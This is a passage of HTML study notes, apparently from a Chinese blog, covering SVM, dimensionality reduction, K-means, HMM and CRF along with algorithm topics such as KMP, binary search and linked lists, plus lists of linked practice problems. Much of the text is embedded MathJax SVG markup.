-238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>（强对偶关系）</li>
<li>KKT约束条件（强对偶性的充要条件）</li>
<li>SMO（序列最小优化）算法求<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.027ex" xmlns="http://www.w3.org/2000/svg" width="2.232ex" height="1.597ex" role="img" focusable="false" viewBox="0 -694 986.6 706"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mi"><path data-c="1D706" d="M166 673Q166 685 183 694H202Q292 691 316 644Q322 629 373 486T474 207T524 67Q531 47 537 34T546 15T551 6T555 2T556 -2T550 -11H482Q457 3 450 18T399 152L354 277L340 262Q327 246 293 207T236 141Q211 112 174 69Q123 9 111 -1T83 -12Q47 -12 47 20Q47 37 61 52T199 187Q229 216 266 252T321 306L338 322Q338 323 288 462T234 612Q214 657 183 657Q166 657 166 673Z"></path></g><g data-mml-node="mo" transform="translate(583, 363) scale(0.707)"><path data-c="2217" d="M229 286Q216 420 216 436Q216 454 240 464Q241 464 245 464T251 465Q263 464 273 456T283 436Q283 419 277 356T270 286L328 328Q384 369 389 372T399 375Q412 375 423 365T435 338Q435 325 425 315Q420 312 357 282T289 250L355 219L425 184Q434 175 434 161Q434 146 425 136T401 125Q393 125 383 131T328 171L270 213Q283 79 283 63Q283 53 276 44T250 35Q231 35 224 44T216 63Q216 80 222 143T229 213L171 171Q115 130 110 127Q106 124 100 124Q87 124 76 134T64 161Q64 166 64 169T67 175T72 181T81 188T94 195T113 204T138 215T170 230T210 250L74 315Q65 324 65 338Q65 353 74 363T98 374Q106 374 116 368T171 328L229 286Z"></path></g></g></g></g></svg></mjx-container></li>
</ul>
</li>
<li>软间隔（允许个别样本点出现在间隔带里）<ul>
<li>松弛变量<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.464ex" xmlns="http://www.w3.org/2000/svg" width="0.991ex" height="2.057ex" role="img" focusable="false" viewBox="0 -704 438 909"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D709" d="M268 632Q268 704 296 704Q314 704 314 687Q314 682 311 664T308 635T309 620V616H315Q342 619 360 619Q443 619 443 586Q439 548 358 546H344Q326 546 317 549T290 566Q257 550 226 505T195 405Q195 381 201 364T211 342T218 337Q266 347 298 347Q375 347 375 314Q374 297 359 288T327 277T280 275Q234 275 208 283L195 286Q149 260 119 214T88 130Q88 116 90 108Q101 79 129 63T229 20Q238 17 243 15Q337 -21 354 -33Q383 -53 383 -94Q383 -137 351 -171T273 -205Q240 -205 202 -190T158 -167Q156 -163 156 -159Q156 -151 161 -146T176 -140Q182 -140 189 -143Q232 -168 274 -168Q286 -168 292 -165Q313 -151 313 -129Q313 -112 301 -104T232 -75Q214 -68 204 -64Q198 -62 171 -52T136 -38T107 -24T78 -8T56 12T36 37T26 66T21 103Q21 149 55 206T145 301L154 307L148 313Q141 319 136 323T124 338T111 358T103 382T99 413Q99 471 143 524T259 602L271 607Q268 618 268 632Z"></path></g></g></g></svg></mjx-container></li>
</ul>
</li>
<li>核函数（线性不可分）<ul>
<li>非线性SVM（映射到更高维度）</li>
<li><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.666ex" xmlns="http://www.w3.org/2000/svg" width="21.23ex" height="2.363ex" role="img" focusable="false" viewBox="0 -750 9383.8 1044.2"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D458" d="M121 647Q121 657 125 670T137 683Q138 683 209 688T282 694Q294 694 294 686Q294 679 244 477Q194 279 194 272Q213 282 223 291Q247 309 292 354T362 415Q402 442 438 442Q468 442 485 423T503 369Q503 344 496 327T477 302T456 291T438 288Q418 288 406 299T394 328Q394 353 410 369T442 390L458 393Q446 405 434 405H430Q398 402 367 380T294 316T228 255Q230 254 243 252T267 246T293 238T320 224T342 206T359 180T365 147Q365 130 360 106T354 66Q354 26 381 26Q429 26 459 145Q461 153 479 153H483Q499 153 499 144Q499 139 496 130Q455 -11 378 -11Q333 -11 305 15T277 90Q277 108 280 121T283 145Q283 167 269 183T234 206T200 217T182 220H180Q168 178 159 139T145 81T136 44T129 20T122 7T111 -2Q98 -11 83 -11Q66 -11 57 -1T48 16Q48 26 85 176T158 471L195 616Q196 629 188 632T149 637H144Q134 637 131 637T124 640T121 647Z"></path></g><g data-mml-node="mo" transform="translate(521, 0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msub" transform="translate(910, 0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mi" transform="translate(572, -150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(1776, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(2220.6, 0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mi" transform="translate(572, -150) scale(0.707)"><path data-c="1D457" d="M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z"></path></g></g><g data-mml-node="mo" transform="translate(3133.9, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(3800.7, 0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mi" transform="translate(4856.5, 0)"><path data-c="1D719" d="M409 688Q413 694 421 694H429H442Q448 688 448 686Q448 679 418 563Q411 535 404 504T392 458L388 442Q388 441 397 441T429 435T477 418Q521 397 550 357T579 260T548 151T471 65T374 11T279 -10H275L251 -105Q245 -128 238 -160Q230 -192 227 -198T215 -205H209Q189 -205 189 -198Q189 -193 211 -103L234 -11Q234 -10 226 -10Q221 -10 206 -8T161 6T107 36T62 89T43 171Q43 231 76 284T157 370T254 422T342 441Q347 441 348 445L378 567Q409 686 409 688ZM122 150Q122 116 134 91T167 53T203 35T237 27H244L337 404Q333 404 326 403T297 395T255 379T211 350T170 304Q152 276 137 237Q122 191 122 150ZM500 282Q500 320 484 347T444 385T405 400T381 404H378L332 217L284 29Q284 27 285 27Q293 27 317 33T357 47Q400 66 431 100T475 170T494 234T500 282Z"></path></g><g data-mml-node="mo" transform="translate(5452.5, 0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msub" transform="translate(5841.5, 0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mi" transform="translate(572, -150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(6707.5, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mi" transform="translate(7096.5, 0)"><path data-c="1D719" d="M409 688Q413 694 421 694H429H442Q448 688 448 686Q448 679 418 563Q411 535 404 504T392 458L388 442Q388 441 397 441T429 435T477 418Q521 397 550 357T579 260T548 151T471 65T374 11T279 -10H275L251 -105Q245 -128 238 -160Q230 -192 227 -198T215 -205H209Q189 -205 189 -198Q189 -193 211 -103L234 -11Q234 -10 226 -10Q221 -10 206 -8T161 6T107 36T62 89T43 171Q43 231 76 284T157 370T254 422T342 441Q347 441 348 445L378 567Q409 686 409 688ZM122 150Q122 116 134 91T167 53T203 35T237 27H244L337 404Q333 404 326 403T297 395T255 379T211 350T170 304Q152 276 137 237Q122 191 122 150ZM500 282Q500 320 484 347T444 385T405 400T381 404H378L332 217L284 29Q284 27 285 27Q293 27 317 33T357 47Q400 66 431 100T475 170T494 234T500 282Z"></path></g><g data-mml-node="mo" transform="translate(7692.5, 0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msub" transform="translate(8081.5, 0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mi" transform="translate(572, -150) scale(0.707)"><path data-c="1D457" d="M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z"></path></g></g><g data-mml-node="mo" transform="translate(8994.8, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>减少映射的计算量</li>
<li>常用核函数<ul>
<li>线性核函数</li>
<li>多项式核（不平稳，数据已归一化）</li>
<li>RBF核（高斯核）<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.489ex" xmlns="http://www.w3.org/2000/svg" width="1.229ex" height="1.486ex" role="img" focusable="false" viewBox="0 -441 543 657"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D6FE" d="M31 249Q11 249 11 258Q11 275 26 304T66 365T129 418T206 441Q233 441 239 440Q287 429 318 386T371 255Q385 195 385 170Q385 166 386 166L398 193Q418 244 443 300T486 391T508 430Q510 431 524 431H537Q543 425 543 422Q543 418 522 378T463 251T391 71Q385 55 378 6T357 -100Q341 -165 330 -190T303 -216Q286 -216 286 -188Q286 -138 340 32L346 51L347 69Q348 79 348 100Q348 257 291 317Q251 355 196 355Q148 355 108 329T51 260Q49 251 47 251Q45 249 31 249Z"></path></g></g></g></svg></mjx-container>（最常用）</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>降维 PCA和LDA<ul>
<li>PCA<ul>
<li>最大化投影的方差</li>
</ul>
</li>
<li>LDA（Linear Discriminant Analysis）有监督<ul>
<li>最大化类间距离以及最小化类内距离</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="算法-1"><a href="#算法-1" class="headerlink" title="算法"></a>算法</h2><ul>
<li>KMP算法<ul>
<li>字符串匹配</li>
<li>空间换时间</li>
<li>部分匹配表PMT：记录字符串前缀集合和后缀集合交集中最长元素长度（子字符串p）<ul>
<li>向右移动一位得到next数组，0位填-1</li>
<li>根据p求解next</li>
</ul>
</li>
</ul>
</li>
<li>二分搜索<ul>
<li><code>while left &lt;= right</code> if <code>right = str.len - 1</code></li>
<li><code>mid = lower + (upper - lower) // 2</code> 防止溢出</li>
<li>目标有多个重复<ul>
<li>最左侧<ul>
<li><code>left = 0 right = str.len # [)</code></li>
<li><code>while left &lt; right # [left, left)</code></li>
<li><code>mid = (left + right) // 2</code></li>
<li><code>if str[mid] == target: right = mid</code></li>
<li><code>if str[mid] &lt; target: left = mid + 1</code></li>
<li><code>if str[mid] &gt; target: right = mid</code></li>
<li><code>return left</code></li>
</ul>
</li>
<li>最右侧<ul>
<li><code>left = 0 right = str.len # [)</code></li>
<li><code>while left &lt; right # [right, right)</code></li>
<li><code>mid = (left + right) // 2</code></li>
<li><code>if str[mid] == target: left = mid + 1</code></li>
<li><code>if str[mid] &lt; target: left = mid + 1</code></li>
<li><code>if str[mid] &gt; target: right = mid</code></li>
<li><code>return left - 1</code></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>哈希表</li>
</ul>
<h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><h4 id="算法刷题重点题型-1"><a href="#算法刷题重点题型-1" class="headerlink" title="算法刷题重点题型"></a>算法刷题重点题型</h4><ul>
<li><p>[ ] 替换空格：<a href="https://www.nowcoder.com/practice/4060ac7e3e404ad1a894ef3e17650423">https://www.nowcoder.com/practice/4060ac7e3e404ad1a894ef3e17650423</a></p>
</li>
<li><p>[ ] 正则表达式匹配：<a href="https://www.nowcoder.com/practice/45327ae22b7b413ea21df13ee7d6429c">https://www.nowcoder.com/practice/45327ae22b7b413ea21df13ee7d6429c</a></p>
</li>
<li><p>[ ] 表示数值的字符串：<a href="https://www.nowcoder.com/practice/6f8c901d091949a5837e24bb82a731f2">https://www.nowcoder.com/practice/6f8c901d091949a5837e24bb82a731f2</a></p>
</li>
<li><p>[ ] 字符流中第一个不重复的字符：<a href="https://www.nowcoder.com/practice/00de97733b8e4f97a3fb5c680ee10720">https://www.nowcoder.com/practice/00de97733b8e4f97a3fb5c680ee10720</a></p>
</li>
<li><p>[ ] 二分搜索（69）：<a href="https://leetcode-cn.com/problems/sqrtx/">https://leetcode-cn.com/problems/sqrtx/</a></p>
</li>
<li><p>[ ] 哈希表（1）：<a href="https://leetcode-cn.com/problems/two-sum/">https://leetcode-cn.com/problems/two-sum/</a></p>
</li>
<li><p>[ ] 旋转数组的最小数字：<a href="https://www.nowcoder.com/practice/9f3231a991af4f55b95579b44b7a01ba">https://www.nowcoder.com/practice/9f3231a991af4f55b95579b44b7a01ba</a></p>
</li>
</ul>
<h4 id="算法刷题课后作业-1"><a href="#算法刷题课后作业-1" class="headerlink" title="算法刷题课后作业"></a>算法刷题课后作业</h4><ul>
<li><p>[ ] 左旋转字符串：<a href="https://www.nowcoder.com/practice/12d959b108cb42b1ab72cef4d36af5ec">https://www.nowcoder.com/practice/12d959b108cb42b1ab72cef4d36af5ec</a></p>
</li>
<li><p>[ ] 字符串的排列：<a href="https://www.nowcoder.com/practice/fe6b651b66ae47d7acce78ﬀdd9a96c7">https://www.nowcoder.com/practice/fe6b651b66ae47d7acce78ﬀdd9a96c7</a></p>
</li>
<li><p>[ ] 第一个只出现一次的字符：<a href="https://www.nowcoder.com/practice/1c82e8cf713b4bbeb2a5b31cf5b0417c">https://www.nowcoder.com/practice/1c82e8cf713b4bbeb2a5b31cf5b0417c</a></p>
</li>
<li><p>[ ] 在排序数组中查找元素的第一个和最后一个位置（34）：<a href="https://leetcode-cn.com/problems/find-first-and-last-position-of-element-in-sorted-array/">https://leetcode-cn.com/problems/find-first-and-last-position-of-element-in-sorted-array/</a></p>
</li>
<li><p>[ ] 找到 K 个最接近的元素（658）：<a href="https://leetcode-cn.com/problems/find-k-closest-elements/">https://leetcode-cn.com/problems/find-k-closest-elements/</a></p>
</li>
<li><p>[ ] 长度最小的子数组（209）：<a href="https://leetcode-cn.com/problems/minimum-size-subarray-sum/">https://leetcode-cn.com/problems/minimum-size-subarray-sum/</a></p>
</li>
<li><p>[ ] 有序矩阵中第 K 小的元素（378）：<a href="https://leetcode-cn.com/problems/kth-smallest-element-in-a-sorted-matrix/">https://leetcode-cn.com/problems/kth-smallest-element-in-a-sorted-matrix/</a></p>
</li>
</ul>
<h1 id="Week-3"><a href="#Week-3" class="headerlink" title="Week 3"></a>Week 3</h1><h2 id="机器学习-2"><a href="#机器学习-2" class="headerlink" title="机器学习"></a>机器学习</h2><ul>
<li>K-means<ul>
<li>EM（Expectation Maximum）算法</li>
<li>收敛性证明</li>
</ul>
</li>
</ul>
<h2 id="算法-2"><a href="#算法-2" class="headerlink" title="算法"></a>算法</h2><ul>
<li>虚拟头结点</li>
<li>删除链表中重复的结点<ul>
<li>3指针：基准、快、慢</li>
</ul>
</li>
<li>链表中环的入口结点<ul>
<li>哈希表</li>
<li>快慢指针</li>
</ul>
</li>
<li>栈和队列<ul>
<li>由链表实现 <code>[].pop(0) [].pop()</code></li>
</ul>
</li>
</ul>
<h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><h4 id="算法刷题重点题型-2"><a href="#算法刷题重点题型-2" class="headerlink" title="算法刷题重点题型"></a>算法刷题重点题型</h4><ul>
<li><p>[ ] 删除链表中重复的结点：<a href="https://www.nowcoder.com/practice/fc533c45b73a41b0b44ccba763f866ef">https://www.nowcoder.com/practice/fc533c45b73a41b0b44ccba763f866ef</a></p>
</li>
<li><p>[ ] 链表中环的入口结点：<a href="https://www.nowcoder.com/practice/253d2c59ec3e4bc68da16833f79a38e4">https://www.nowcoder.com/practice/253d2c59ec3e4bc68da16833f79a38e4</a></p>
</li>
<li><p>[ ] 用两个栈实现队列：<a href="https://www.nowcoder.com/practice/54275ddae22f475981afa2244dd448c6">https://www.nowcoder.com/practice/54275ddae22f475981afa2244dd448c6</a></p>
</li>
<li><p>[ ] 滑动窗口的最大值：<a href="https://www.nowcoder.com/practice/1624bc35a45c42c0bc17d17fa0cba788">https://www.nowcoder.com/practice/1624bc35a45c42c0bc17d17fa0cba788</a></p>
</li>
</ul>
<h4 id="算法刷题课后作业-2"><a href="#算法刷题课后作业-2" class="headerlink" title="算法刷题课后作业"></a>算法刷题课后作业</h4><ul>
<li><p>[ ] 从尾到头打印链表：<a href="https://www.nowcoder.com/practice/d0267f7f55b3412ba93bd35cfa8e8035">https://www.nowcoder.com/practice/d0267f7f55b3412ba93bd35cfa8e8035</a></p>
</li>
<li><p>[ ] 相交链表（160）：<a href="https://leetcode-cn.com/problems/intersection-of-two-linked-lists/">https://leetcode-cn.com/problems/intersection-of-two-linked-lists/</a></p>
</li>
<li><p>[ ] 用栈实现队列（232）：<a href="https://leetcode-cn.com/problems/implement-queue-using-stacks/">https://leetcode-cn.com/problems/implement-queue-using-stacks/</a></p>
</li>
</ul>
<h1 id="Week-4"><a href="#Week-4" class="headerlink" title="Week 4"></a>Week 4</h1><h2 id="机器学习-3"><a href="#机器学习-3" class="headerlink" title="机器学习"></a>机器学习</h2><ul>
<li>HMM<ul>
<li>概率模型<ul>
<li>生成模型 联合概率分布</li>
<li>判别模型 条件概率分布</li>
</ul>
</li>
<li>基本假设<ul>
<li>齐次马尔可夫假设</li>
<li>观测独立性检测</li>
</ul>
</li>
<li>基本问题<ul>
<li>概率计算：计算观测值的概率<ul>
<li>直接计算</li>
<li>前向、后向算法（DP）</li>
</ul>
</li>
<li>预测/解码：通过观测序列求状态序列<ul>
<li>维特比算法（DP）Viterbi</li>
</ul>
</li>
<li>学习/训练：计算<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.027ex" xmlns="http://www.w3.org/2000/svg" width="1.319ex" height="1.597ex" role="img" focusable="false" viewBox="0 -694 583 706"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D706" d="M166 673Q166 685 183 694H202Q292 691 316 644Q322 629 373 486T474 207T524 67Q531 47 537 34T546 15T551 6T555 2T556 -2T550 -11H482Q457 3 450 18T399 152L354 277L340 262Q327 246 293 207T236 141Q211 112 174 69Q123 9 111 -1T83 -12Q47 -12 47 20Q47 37 61 52T199 187Q229 216 266 252T321 306L338 322Q338 323 288 462T234 612Q214 657 183 657Q166 657 166 673Z"></path></g></g></g></svg></mjx-container><ul>
<li>有监督</li>
<li>无监督：仅观测序列<ul>
<li>Baum-Welch算法</li>
</ul>
</li>
</ul>
</li>
<li>实例<ul>
<li><code>from hmmlearn import hmm</code></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>CRF 条件随机场<ul>
<li>基础概念<ul>
<li>概率有向图模型 HMM 贝叶斯网络</li>
<li>概率无向图模型 马尔可夫网络 马尔可夫随机场（MRF）（生成式模型）</li>
<li>团Clique：图中节点的子集，其中任意2个节点有边直接连接</li>
<li>势函数：<strong>非负</strong>实函数</li>
<li>Hammersley-Clifford定理<ul>
<li>MRF表达为正概率分布</li>
</ul>
</li>
<li>分离 分离集</li>
<li>特征函数</li>
</ul>
</li>
<li>CRF 判别式模型 有条件的MRF<ul>
<li>线性链CRF<ul>
<li>指数势函数</li>
</ul>
</li>
<li>三个问题<ul>
<li>概率计算</li>
<li>预测</li>
<li>学习</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="算法-3"><a href="#算法-3" class="headerlink" title="算法"></a>算法</h2><ul>
<li>DFS和BFS<ul>
<li>BFS (279)<ul>
<li>队列</li>
<li>邻接表 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="13.207ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 5837.4 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D442" d="M740 435Q740 320 676 213T511 42T304 -22Q207 -22 138 35T51 201Q50 209 50 244Q50 346 98 438T227 601Q351 704 476 704Q514 704 524 703Q621 689 680 617T740 435ZM637 476Q637 565 591 615T476 665Q396 665 322 605Q242 542 200 428T157 216Q157 126 200 73T314 19Q404 19 485 98T608 313Q637 408 637 476Z"></path></g><g data-mml-node="mo" transform="translate(763, 0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(1152, 0)"><path data-c="1D449" d="M52 648Q52 670 65 683H76Q118 680 181 680Q299 680 320 683H330Q336 677 336 674T334 656Q329 641 325 637H304Q282 635 274 635Q245 630 242 620Q242 618 271 369T301 118L374 235Q447 352 520 471T595 594Q599 601 599 609Q599 633 555 637Q537 637 537 648Q537 649 539 661Q542 675 545 679T558 683Q560 683 570 683T604 682T668 681Q737 681 755 683H762Q769 676 769 672Q769 655 760 640Q757 637 743 637Q730 636 719 635T698 630T682 623T670 615T660 608T652 599T645 592L452 282Q272 -9 266 -16Q263 -18 259 -21L241 -22H234Q216 -22 216 -15Q213 -9 177 305Q139 623 138 626Q133 637 76 637H59Q52 642 52 648Z"></path></g><g data-mml-node="mo" transform="translate(1921, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(2532.2, 0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mi" transform="translate(3532.4, 0)"><path data-c="1D442" d="M740 435Q740 320 676 213T511 42T304 -22Q207 -22 138 35T51 201Q50 209 50 244Q50 346 98 438T227 601Q351 704 476 704Q514 704 524 703Q621 689 680 617T740 435ZM637 476Q637 565 591 615T476 665Q396 665 322 605Q242 542 200 428T157 216Q157 126 200 73T314 19Q404 19 485 98T608 313Q637 408 637 